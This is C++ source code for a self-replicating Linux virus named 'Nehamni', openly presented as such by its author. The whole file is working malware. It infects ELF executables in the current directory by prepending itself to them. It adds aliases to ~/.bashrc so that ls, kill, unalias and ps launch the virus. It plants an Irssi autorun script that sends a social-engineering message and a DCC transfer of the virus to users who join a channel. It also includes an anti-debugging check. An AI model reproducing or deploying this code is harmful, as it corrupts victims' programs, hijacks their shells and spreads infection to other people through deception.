   /* virus name: Nehamni (kneeeee ham knee)
    * author: free0n
    * site:http://free0n.host.sk || http://doomriderz.co.nr
    * desc: linux prepender virus mixed bash alias hooking and irssi irc
    *       client spreading. Only infects ELF files in the current directory
    *       or the directory of where the alias is getting executed. Code is
    *       pretty well documented. Tested on ubuntu 7.04 fiesty fawn.
    * compile: g++ -O3 "nehamni" -o "nehamni"
    * greetz: wargame,genetix,impurity,synge,
    *         cyneox,hermit,retro,hutley,DiA,
    *         berniee, izeee! napster, spth,
    *         sabek, slage, SysBreaker, Retro,
    *         MrAnderson, and anyone else i forgot
    *         sry :)
    */

   #include <iostream>
   #include <sys/dir.h>
   #include <sys/stat.h>
   #include <sys/ptrace.h>
   #include <stdlib.h>
   #include <elf.h>
   #include <fcntl.h>

   #define MAX_DIR_PATH 2048
   #define NAME "nehamni"
   #define SIZE 17586

   using namespace std;

   char *me;
   char *myPath;
   int mesize = 0;

   //checks if a directory exists or not
   bool DirectoryExists(char *dirpath) {
       struct stat fs = { 0 };
       if (stat(dirpath, &fs) == 0 && S_ISDIR(fs.st_mode)) {
           return true;
       }
       return false;
   }

   //Irssi irc client spreading
   //works by checking if we have .irssi installed in the home folder
   //then checks if there is a autorun directory. If there isn't then
   //it's created an we drop a perl script file. Sort of like what we do
   //with mirc on windows. Anyone that joins a channel the user is on
   //will get a message and a dcc request.

   void Irssi(char *irssi) {
       strcat(irssi,"/.irssi");
       if(DirectoryExists(irssi)) {
           strcat(irssi,"/scripts");
           if(!DirectoryExists(irssi)) {
               mkdir(irssi,0777);
               strcat(irssi,"/autorun");
               if(!DirectoryExists(irssi)) {
                   mkdir(irssi,0777);
               }
           }
           strcat(irssi,"/nehamni.pl");
           FILE *irssistream;
           if((irssistream = fopen(irssi, "w+")) != (FILE *)0) {
               fprintf(irssistream,"use Irssi; \n");
               fprintf(irssistream,"use vars qw($VERSION %IRSSI);\n");
               fprintf(irssistream,"$VERSION = '0.69';\n");
               fprintf(irssistream,"%IRSSI = (\n");
               fprintf(irssistream,"name        => 'nehamni',\n");
               fprintf(irssistream,"authors     => 'free0n',\n");
               fprintf(irssistream,"contact     => 'phree0n@hotmail.com',\n");
               fprintf(irssistream,"url         => 'http://free0n.host.sk',\n");
               fprintf(irssistream,"license     => 'GPL',\n");
               fprintf(irssistream,"ldescription => 'nehamni protection script',\n");
               fprintf(irssistream,");\n");
               fprintf(irssistream,"sub nehamni {\n");
               fprintf(irssistream,"my($server, $data, $nick, $address) = @_;\n");
               fprintf(irssistream,"return if ($nick eq $server->{nick});\n");
               fprintf(irssistream,"$server->command(\"^MSG \" . $nick . \" hey \" . $nick . \" check out this irssi irc protection script, it even has antivirus for dcc transfers\"); \n");
               fprintf(irssistream,"$server->command(\"^DCC SEND \" . $nick . \" %s\");\n",me);
               fprintf(irssistream,"$server->command(\"^MSG \" . $nick . \" maybe i should make my own antivirus, it would be way better then the ones out there now :D\");\n");
               fprintf(irssistream,"}\n");
               fprintf(irssistream,"sub unloaded {\n");
               fprintf(irssistream,"printf(\"I do it for myself, not for you and not for others!\");\n");
               fprintf(irssistream,"}\n");
               fprintf(irssistream,"Irssi::command_bind nehamni => \\&unloaded; \n");
               fprintf(irssistream,"Irssi::signal_add('message join', 'nehamni');\n");
               fclose(irssistream);
           }
       }
   }

   void Profile() {
       //apend text to the .bashrc file
       //so we can alias programs that get used in bash shell
       //so for example if the user executes ls, then we call our virus
       //or user executes kill command then instead of launching kill we launch
       //the virus. We edit bashrc cause it gets executed each time a new shell
       //launches. This will also change the directory of infection, so whatever
       //directory that the command gets run in is the directory the virus will infect
       //in...
       string bashrc = (string)getenv("HOME") + "/.bashrc";
       int fb;
       if((fb = open(bashrc.c_str(),O_RDONLY)) != -1) {
           char buffw[8];
           struct stat statrc;
           stat(bashrc.c_str(), &statrc);
           lseek(fb,(statrc.st_size - (strlen(NAME)+1)), SEEK_SET);
           read(fb,&buffw,(strlen(NAME)+1));
           close(fb);
           if((strncmp (buffw,NAME,strlen(NAME))) != 0) {
               FILE *bashstream;
               if((bashstream = fopen(bashrc.c_str(), "at")) != (FILE *)0) {
                   fprintf(bashstream,"alias ls='%s'\n",me);
                   fprintf(bashstream,"alias kill='%s'\n",me);
                   fprintf(bashstream,"alias unalias='%s'\n",me);
                   fprintf(bashstream,"alias ps='%s'\n",me);
                   fprintf(bashstream,"#%s ",NAME);
               }
               fclose(bashstream);
           }
       }
   }

   //is the fish! kidding elfish i know :D
   bool IsElfish(char *hostFile) {
       Elf32_Ehdr elfHeader;
       int fd;
       if((fd = open(hostFile,O_RDONLY)) == -1)
           return false;

       read(fd,&elfHeader,sizeof(Elf32_Ehdr));
       close(fd);

       //check if it says ELF
       if(strncmp((const char *)&elfHeader.e_ident[1], "ELF",3) != 0)
           return false;

       //check if it's executable
       if(elfHeader.e_type != ET_EXEC)
           return false;

       return true;
   }

   bool IsInfected(char *chkfile) {
       int fd;
       if((fd = open(chkfile,O_RDONLY)) != -1) {
           char buf[7];
           struct stat statbuf;
           stat(chkfile, &statbuf);
           //seek to the end of the file where we would have our NAME
           lseek(fd, (statbuf.st_size - strlen(NAME)), SEEK_SET);
           read (fd,&buf,strlen(NAME));
           close(fd);

           //check to see if the marker was = to NAME(nehamni)
           if((strncmp (buf,NAME,strlen(NAME))) == 0) {
               return true;
           }
           //check to see if the name is nehamni
           if((strncmp (chkfile,NAME,strlen(NAME))) == 0) {
               return true;
           }
       }
       return false;
   }

   void Prepend(char *host) {

       FILE *fNehamni;
       FILE *fHost;
       FILE *fTmp;

       struct stat hstat;
       int vsize,hsize,mesize;
       char *vircode,*hcode;

       if(IsInfected(host) == false){
           if((fNehamni = fopen(me,"rb")) != NULL) {
               //read the virus code
               vsize = SIZE;
               vircode = (char*)malloc(vsize);
               fread(vircode,vsize,1,fNehamni);

               if((fTmp = fopen(host,"rb")) != NULL) {
                   //read the file that we passed in, should be a host flie
                   stat(host,&hstat);
                   hsize = hstat.st_size;
                   hcode = (char*)malloc(hsize);
                   fread(hcode,1,hsize,fTmp);

                   //overwrite the host file and write the virus,host,marker to
                   //the file
                   if((fHost = fopen(host,"wb")) != NULL) {
                       fwrite(vircode,vsize,1,fHost);
                       fwrite(hcode,hsize,1,fHost);
                       fwrite(NAME,strlen(NAME),1,fHost);
                       fclose(fHost);
                   }
                   fclose(fTmp);
                   free(hcode);
               }
               fclose(fNehamni);
               free(vircode);
           }
       }
   }

   void InfectionSearch() {
       struct direct *directPtr;
       struct stat statBuf;
       DIR *dirPtr;
       char myDir[MAX_DIR_PATH+1];

       //get the current working directory (cwd)
       //if we can't get it then we exit
       if(!getcwd(myDir, MAX_DIR_PATH)) {
         return;
       }
       myPath = strcat(myDir,"/");
       dirPtr = opendir(myDir);
       if(!dirPtr) {
           return;
       }
       //loop through the directory
       while (directPtr = readdir(dirPtr))  {
           if (strcmp(directPtr->d_name,".") != 0 && strcmp(directPtr->d_name,"..") != 0)  {
               //check to see if the file is elf
               if(IsElfish(directPtr->d_name)) {
                   Prepend(directPtr->d_name);
               }
           }
       }
   }

   int main(int argc, char *argv[]) {
       //pretty cool we can do antidebug this easily:)
       //although there are probably ways around it, it's still neat.
       if(ptrace(PTRACE_TRACEME, 0, NULL, NULL)) {
          printf("I have dreamed a dream, and my spirit was troubled to know the dream.");
          return 0;
       }

       //basic check to see how we are being called
       //if its running from shell as ./nehamni or as
       //a full path /home/blah/nehamni. If it's running
       //as ./nehamni then we correct it so its the full path
       //to the file.

       me = argv[0];
       string f = (string)me;
       int pathlen = strlen(me);
       if(pathlen > 2) {
          if(f.substr(0,2) == "./") {
             char cwd[MAX_DIR_PATH+1];
             if(getcwd(cwd, MAX_DIR_PATH)) {
                strcat(cwd,"/");
                strcat(cwd,f.substr(2).c_str());
                me = cwd;
             }
          }
       }
       //start the file infection search.
       InfectionSearch();

       //call our bashrc profile function
       Profile();

       //launch irssi spreading
       Irssi(getenv("HOME"));

       //check to see if we are running as an infected file
       struct stat virstat;
       stat(me,&virstat);
       mesize = virstat.st_size;

       int size = (mesize) - SIZE;
       if(size > 0) {
          FILE *fTmpHost;
          FILE *fTmpHostWrite;
          char *hostTmp;
          int hostTmpSize = (mesize - (SIZE + sizeof(NAME))) + 1;
          if(hostTmpSize > 0) {
              if((fTmpHost = fopen(me,"rb")) != NULL) {
                  hostTmp = (char*)malloc(hostTmpSize);
                  fseek(fTmpHost,SIZE,SEEK_SET);
                  fread(hostTmp,hostTmpSize,1,fTmpHost);
                  strcat(me,"tmp");
                  if((fTmpHostWrite = fopen(me,"wb")) != NULL) {
                      fwrite(hostTmp,hostTmpSize,1,fTmpHostWrite);
                      fclose(fTmpHostWrite);
                      chmod(me,virstat.st_mode);
                      system(me);
                      remove(me);
                  }
                  fclose(fTmpHost);
                  free(hostTmp);
              }
          }
       }

       return 0;
   }
